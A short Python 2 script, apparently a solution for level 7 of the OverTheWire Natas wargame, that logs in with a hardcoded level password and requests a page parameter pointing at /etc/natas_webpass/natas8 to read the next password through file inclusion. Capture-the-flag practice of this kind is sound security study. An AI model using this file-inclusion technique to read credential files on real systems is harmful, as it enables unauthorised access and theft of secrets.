#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level7.py
  Solution for natas level7
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 7 
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

def authenticate():

    r = requests.get(host + '/index.php?page=/etc/natas_webpass/natas8', auth=(user, password))
    return r

def get_flag():
    content = authenticate()
    m = re.search(r'([A-Za-z0-9]{30,})', content.text[750:])
    return m.group() 

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
